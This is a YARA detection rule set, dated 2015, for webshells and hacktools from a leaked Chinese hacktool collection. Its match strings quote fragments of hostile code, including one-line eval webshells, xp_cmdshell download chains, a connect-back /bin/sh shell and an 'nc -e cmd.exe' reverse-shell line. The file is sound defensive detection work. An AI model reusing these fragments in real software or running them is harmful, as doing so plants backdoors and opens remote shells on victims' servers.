/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-06-13
    Identifier: CN-Tools Webshells
    Reference: Diclosed hacktool set at http://w2op.us/ (Mirror: http://tools.zjqhr.com)
*/


rule Tools_cmd {
    meta:
        description = "Chinese Hacktool Set - file cmd.jSp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "02e37b95ef670336dc95331ec73dbb5a86f3ba2b"
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
        $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
        $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
        $s4 = "while((a=in.read(b))!=-1){" fullword ascii
        $s5 = "out.println(new String(b));" fullword ascii
        $s6 = "out.print(\"</pre>\");" fullword ascii
        $s7 = "out.print(\"<pre>\");" fullword ascii
        $s8 = "int a = -1;" fullword ascii
        $s9 = "byte[] b = new byte[2048];" fullword ascii
    condition:
        filesize < 3KB and 7 of them
}


rule trigger_drop {
    meta:
        description = "Chinese Hacktool Set - file trigger_drop.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"
    strings:
        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s2 = "@mssql_query('DROP TRIGGER" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule InjectionParameters {
    meta:
        description = "Chinese Hacktool Set - file InjectionParameters.vb"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"
    strings:
        $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
        $s1 = "Public Class InjectionParameters" fullword ascii
    condition:
        filesize < 13KB and all of them
}

rule users_list {
    meta:
        description = "Chinese Hacktool Set - file users_list.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"
    strings:
        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
    condition:
        filesize < 12KB and all of them
}

rule trigger_modify {
    meta:
        description = "Chinese Hacktool Set - file trigger_modify.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"
    strings:
        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
        $s3 = "if($_POST['query'] != '')" fullword ascii
        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
        $s5 = "<b>Modify Trigger</b>" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Customize {
    meta:
        description = "Chinese Hacktool Set - file Customize.aspx"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "db556879dff9a0101a7a26260a5d0dc471242af2"
    strings:
        $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
        $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
        $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
        $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
    condition:
        filesize < 24KB and all of them
}

rule oracle_data {
    meta:
        description = "Chinese Hacktool Set - file oracle_data.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cf070017be117eace4752650ba6cf96d67d2106"
    strings:
        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
        $s2 = "$id=$_REQUEST['id'];" fullword ascii
    condition:
        all of them
}

rule reDuhServers_reDuh {
    meta:
        description = "Chinese Hacktool Set - file reDuh.jsp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "377886490a86290de53d696864e41d6a547223b0"
    strings:
        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
    condition:
        filesize < 116KB and all of them
}

rule item_old {
    meta:
        description = "Chinese Hacktool Set - file item-old.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "daae358bde97e534bc7f2b0134775b47ef57e1da"
    strings:
        $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
        $s3 = "$sHash = md5($sURL);" fullword ascii
    condition:
        filesize < 7KB and 2 of them
}

rule Tools_2014 {
    meta:
        description = "Chinese Hacktool Set - file 2014.jsp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "74518faf08637c53095697071db09d34dbe8d676"
    strings:
        $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
    condition:
        filesize < 715KB and all of them
}

rule reDuhServers_reDuh_2 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"
    strings:
        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
    condition:
        filesize < 57KB and all of them
}

rule Customize_2 {
    meta:
        description = "Chinese Hacktool Set - file Customize.jsp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "37cd17543e14109d3785093e150652032a85d734"
    strings:
        $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
    condition:
        filesize < 30KB and all of them
}

rule ChinaChopper_one {
    meta:
        description = "Chinese Hacktool Set - file one.asp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cd28163be831a58223820e7abe43d5eacb14109"
    strings:
        $s0 = "<%eval request(" fullword ascii
    condition:
        filesize < 50 and all of them
}

rule CN_Tools_old {
    meta:
        description = "Chinese Hacktool Set - file old.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "f8a007758fda8aa1c0af3c43f3d7e3186a9ff307"
    strings:
        $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
        $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
        $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
    condition:
        filesize < 6KB and all of them
}

rule item_301 {
    meta:
        description = "Chinese Hacktool Set - file item-301.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "15636f0e7dc062437608c1f22b1d39fa15ab2136"
    strings:
        $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
        $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
        $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
        $s4 = "$sURL = $aArg[0];" fullword ascii
    condition:
        filesize < 3KB and 3 of them
}

rule CN_Tools_item {
    meta:
        description = "Chinese Hacktool Set - file item.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "a584db17ad93f88e56fd14090fae388558be08e4"
    strings:
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s3 = "$sWget=\"index.asp\";" fullword ascii
        $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
    condition:
        filesize < 4KB and all of them
}

rule f3_diy {
    meta:
        description = "Chinese Hacktool Set - file diy.asp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "f39c2f64abe5e86d8d36dbb7b1921c7eab63bec9"
    strings:
        $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s5 = ".black {" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 10KB and all of them
}

rule ChinaChopper_temp {
    meta:
        description = "Chinese Hacktool Set - file temp.asp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "b0561ea52331c794977d69704345717b4eb0a2a7"
    strings:
        $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
        $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
        $s2 = "o.language = \"vbscript\"" fullword ascii
        $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Tools_2015 {
    meta:
        description = "Chinese Hacktool Set - file 2015.jsp"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "8fc67359567b78cadf5d5c91a623de1c1d2ab689"
    strings:
        $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
        $s4 = "System.out.println(Oute.toString());" fullword ascii
        $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
        $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
        $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
    condition:
        filesize < 7KB and all of them
}

rule ChinaChopper_temp_2 {
    meta:
        description = "Chinese Hacktool Set - file temp.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "604a4c07161ce1cd54aed5566e5720161b59deee"
    strings:
        $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
    condition:
        filesize < 150 and all of them
}

rule templatr {
    meta:
        description = "Chinese Hacktool Set - file templatr.php"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "759df470103d36a12c7d8cf4883b0c58fe98156b"
    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii
    condition:
        filesize < 70KB and all of them
}

rule reDuhServers_reDuh_3 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.aspx"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "0744f64c24bf4c0bef54651f7c88a63e452b3b2d"
    strings:
        $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
        $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
        $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
        $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
    condition:
        filesize < 40KB and all of them
}

rule ChinaChopper_temp_3 {
    meta:
        description = "Chinese Hacktool Set - file temp.aspx"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
        $s1 = "\"],\"unsafe\");%>" ascii
    condition:
        uint16(0) == 0x253c and filesize < 150 and all of them
}

rule Shell_Asp {
    meta:
        description = "Chinese Hacktool Set Webshells - file Asp.html"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "5e0bc914ac287aa1418f6554ddbe0ce25f2b5f20"
    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "function Command(cmd, str){" fullword ascii
    condition:
        filesize < 100KB and all of them
}


rule Txt_aspxtag {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "42cb272c02dbd49856816d903833d423d3759948"
    strings:
        $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
        $s2 = "sw.Write(wget);" fullword ascii
        $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
    condition:
        filesize < 2KB and all of them
}

rule Txt_php {
    meta:
        description = "Chinese Hacktool Set - Webshells - file php.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "eaa1af4b898f44fc954b485d33ce1d92790858d0"
    strings:
        $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
        $s2 = "gzuncompress($_SESSION['api']),null);" ascii
        $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
        $s4 = "if(empty($_SESSION['api']))" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule Txt_aspx1 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
    strings:
        $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item["
        $s1 = "],\"unsafe\");%>" fullword ascii
    condition:
        filesize < 150 and all of them
}

rule Txt_shell {
    meta:
        description = "Chinese Hacktool Set - Webshells - file shell.c"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "8342b634636ef8b3235db0600a63cc0ce1c06b62"
    strings:
        $s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
        $s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
        $s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
        $s4 = "char shell[]=\"/bin/sh\";" fullword ascii
        $s5 = "connect back door\\n\\n\");" fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_asp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file asp.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "a63549f749f4d9d0861825764e042e299e06a705"
    strings:
        $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 100KB and all of them
}

rule Txt_asp1 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file asp1.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "95934d05f0884e09911ea9905c74690ace1ef653"
    strings:
        $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
    condition:
        filesize < 70KB and 2 of them
}

rule Txt_php_2 {
    meta:
        description = "Chinese Hacktool Set - Webshells - file php.html"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "a7d5fcbd39071e0915c4ad914d31e00c7127bcfc"
    strings:
        $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
        $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
        $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
        $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
        $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
        $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
        $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
        $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
    condition:
        filesize < 100KB and 4 of them
}

rule Txt_ftp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file ftp.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "3495e6bcb5484e678ce4bae0bd1a420b7eb6ad1d"
    strings:
        $s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
        $s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
        $s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
        $s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
        $s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
        $s6 = "ftp -s:d:\\ftp.txt " fullword ascii
        $s7 = "echo bye>>d:\\ftp.txt " fullword ascii
    condition:
        filesize < 2KB and 2 of them
}

rule Txt_lcx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file lcx.c"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "ddb3b6a5c5c22692de539ccb796ede214862befe"
    strings:
        $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
        $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
        $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
        $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
        $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
    condition:
        filesize < 25KB and 2 of them
}

rule Txt_jspcmd {
    meta:
        description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "1d4e789031b15adde89a4628afc759859e53e353"
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
    condition:
        filesize < 1KB and 1 of them
}

rule Txt_jsp {
    meta:
        description = "Chinese Hacktool Set - Webshells - file jsp.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "74518faf08637c53095697071db09d34dbe8d676"
    strings:
        $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
    condition:
        filesize < 715KB and 2 of them
}

rule Txt_aspxlcx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "453dd3160db17d0d762e032818a5a10baf234e03"
    strings:
        $s1 = "public string remoteip = " ascii
        $s2 = "=Dns.Resolve(host);" ascii
        $s3 = "public string remoteport = " ascii
        $s4 = "public class PortForward" ascii
    condition:
        uint16(0) == 0x253c and filesize < 18KB and all of them
}

rule Txt_xiao {
    meta:
        description = "Chinese Hacktool Set - Webshells - file xiao.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "b3b98fb57f5f5ccdc42e746e32950834807903b7"
    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
        $s4 = "function Command(cmd, str){" fullword ascii
        $s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_aspx {
    meta:
        description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "ce24e277746c317d887139a0d71dd250bfb0ed58"
    strings:
        $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
        $s2 = "Process[] p=Process.GetProcesses();" fullword ascii
        $s3 = "Copyright &copy; 2009 Bin" ascii
        $s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
    condition:
        filesize < 100KB and all of them
}

rule Txt_Sql {
    meta:
        description = "Chinese Hacktool Set - Webshells - file Sql.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "f7813f1dfa4eec9a90886c80b88aa38e2adc25d5"
    strings:
        $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
        $s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
        $s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
        $s4 = "session(\"login\")=\"\"" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Txt_hello {
    meta:
        description = "Chinese Hacktool Set - Webshells - file hello.txt"
        author = "Florian Roth"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-14"
        hash = "697a9ebcea6a22a16ce1a51437fcb4e1a1d7f079"
    strings:
        $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
        $s2 = "myProcess.Start()" fullword ascii
        $s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
    condition:
        filesize < 25KB and all of them
}
